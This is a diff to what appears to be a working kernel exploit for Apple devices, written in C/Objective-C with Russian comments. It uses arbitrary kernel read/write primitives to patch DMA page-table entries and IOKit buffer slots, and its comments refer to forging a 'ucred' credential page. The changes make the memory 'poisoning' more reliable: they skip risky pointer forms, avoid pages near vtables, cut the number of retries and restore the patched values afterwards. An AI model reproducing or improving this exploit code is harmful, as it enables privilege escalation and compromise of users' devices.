@@ -6292,6 +6292,21 @@ static int kpJSubmitAsync(io_connect_t conn, uint32_t srcID, uint32_t dstID,
                     else if ((uint32_t)q == pfn32 && (q >> 32) && (q >> 32) <= 0x10) form = 4;      // pfn low32 + малый hi32
                     else if (q == (uint64_t)pfn32) form = 2;                                      // 1.9.203: голый pfn, hi=0
                     if (!form) continue;
+                    // 1.9.219: безопасность яда — (1) форма4 ({4<<32,pfn}): НЕ источник
+                    // rewriter'а (никогда его не читал), но ЧЬЯ-ТО живая page-запись —
+                    // удержание яда ~секунды = коррупция чужой подсистемы (тихий ресет
+                    // в retry#2, prev-12). Пропускаем. (2) сосед-vtable (kernel-text
+                    // указатель рядом) = страница объекта — не трогаем ничего.
+                    if (form == 4) continue;
+                    BOOL vtNear = NO;
+                    for (int d = -2; d <= 2 && !vtNear; d++) {
+                        if (d == 0) continue;
+                        long oo = (long)o + d * 8;
+                        if (oo < 0 || oo + 8 > (long)sizeof(pbuf2)) continue;
+                        uint64_t nv = kp_untag_ptr(*(uint64_t *)(pbuf2 + oo));
+                        if (nv >= kconstant(base) && nv < kconstant(base) + 0x6000000ULL) vtNear = YES;
+                    }
+                    if (vtNear) continue;
                     hitAddr[nDep] = kva + o; hitOld[nDep] = q; hitForm[nDep] = form; nDep++;
                 }
             }
@@ -7014,15 +7029,15 @@ static int kpJSubmitAsync(io_connect_t conn, uint32_t srcID, uint32_t dstID,
                   cur == newQs[j] ? @"патч НА МЕСТЕ (execute читает другой источник!)" :
                   cur == origQs[j] ? @"ОТКАТИЛО в оригинал (кто-то переписал слот)" : @"ИЗМЕНЕНО третьим"]);
     }
-    // 1.9.209: откат — лотерея rewriter×prepare. Крутим до 8 розыгрышей в одном
-    // прогоне: перепатч слота+DEP → свежий submit → ждём → чек ctl. ctl при
-    // откате не пачкается (DMA уходит в оригинальный backing) — чек валиден.
-    for (int attempt = 1; !changed && attempt < 8; attempt++) {
+    // 1.9.219: retry ×3 (было 8 — меньше окно яда и нагрузка на мину); форма4 из
+    // массива уже нет; DEP-хиты восстанавливаем после КАЖДОЙ попытки (яд живёт
+    // только в окне execute, не секундами — урок prev-12).
+    for (int attempt = 1; !changed && attempt < 4; attempt++) {
         for (int j = 0; j < nSlots; j++) early_kwrite64(slotVAs[j], newQs[j]);
         for (int i = 0; i < nDep; i++) {
+            if (hitForm[i] == 4) continue;
             uint64_t nq = (hitForm[i] == 1) ? ((hitOld[i] & 0x3fffULL) | ctlPA)
                         : (hitForm[i] == 3) ? (((uint64_t)ctlPFN << 32) | (hitOld[i] & 0xffffffffULL))
-                        : (hitForm[i] == 4) ? ((hitOld[i] & 0xffffffff00000000ULL) | ctlPFN)
                         : (uint64_t)ctlPFN;
             early_kwrite64(hitAddr[i], nq);
         }
@@ -7035,11 +7050,16 @@ static int kpJSubmitAsync(io_connect_t conn, uint32_t srcID, uint32_t dstID,
         uint64_t cur0 = nSlots ? early_kread64(slotVAs[0]) : 0;
         kpNote(r, [NSString stringWithFormat:@"  [RETRY #%d] submit kr=0x%x ctl-changed=%d слот#0=%#018llx",
                   attempt, rkr, changed, (unsigned long long)cur0]);
-        if (!changed) for (int j = 0; j < nSlots; j++) early_kwrite64(slotVAs[j], origQs[j]);
+        if (!changed) {
+            for (int j = 0; j < nSlots; j++) early_kwrite64(slotVAs[j], origQs[j]);
+            for (int i = 0; i < nDep; i++) if (hitForm[i] != 4) early_kwrite64(hitAddr[i], hitOld[i]);
+        }
     }
     // restore всех пропатченных слотов (порт-маршрут или одиночный ranges)
     for (int j = 0; j < nSlots; j++)
         early_kwrite64(slotVAs[j], origQs[j]);
+    // 1.9.219: финальный restore DEP-хитов ВСЕГДА (яд не живёт дольше теста)
+    for (int i = 0; i < nDep; i++) if (hitForm[i] != 4) early_kwrite64(hitAddr[i], hitOld[i]);
     // 1.9.198: restore VA-поля буфера (teardown-safety)
     if (vaFldObj) {
         early_kwrite64(vaFldObj + vaFldOff, vaFldOld);
@@ -7159,6 +7179,8 @@ static int kpJSubmitAsync(io_connect_t conn, uint32_t srcID, uint32_t dstID,
     } else {
         kpNote(r, @"=== контрольная не изменилась — см. выше ===");
     }
+    // 1.9.219: restore DEP-хитов после форжа (яд формы ucredPFN не живёт дальше)
+    if (changed) for (int i = 0; i < nDep; i++) if (hitForm[i] != 4) early_kwrite64(hitAddr[i], hitOld[i]);
     // === 1.9.160 фаза 2: DART PTE patch с живым mapping (раунд 36) ===
     // IOBufferMD вычисляет PA при prepare из kernel VA (+0xb8) — производные поля
     // откатываются per-map (факт железа 1.9.158: откат +0x98). Поэтому: mapping
